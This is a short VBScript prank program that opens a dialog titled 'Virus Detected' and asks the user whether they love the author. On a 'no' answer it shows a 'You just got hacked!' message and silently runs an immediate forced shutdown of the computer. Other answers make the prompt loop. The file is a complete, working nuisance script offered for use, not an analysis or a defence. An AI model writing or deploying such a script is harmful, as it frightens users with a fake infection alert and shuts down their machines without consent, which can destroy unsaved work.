' Prompt the user with a question
Function ask_question()
    input_text = LCase(InputBox("Hello, do you love me? (yes or no)", "Virus Detected"))
    
    If input_text = "yes" Then
        MsgBox "I love you too..." & vbCrLf & "See you later", vbInformation, "Response"
    ElseIf input_text = "no" Then
        MsgBox "But I love you... lol" & vbCrLf & "You just got hacked!", vbCritical, "Response"
        shutdown
    Else
        MsgBox "Invalid response!", vbExclamation, "Response"
        ask_question ' Ask the question again
    End If
End Function

' Shut down the computer
Sub shutdown()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "shutdown -s -t 0", 0, True
End Sub

' Ask the question
ask_question
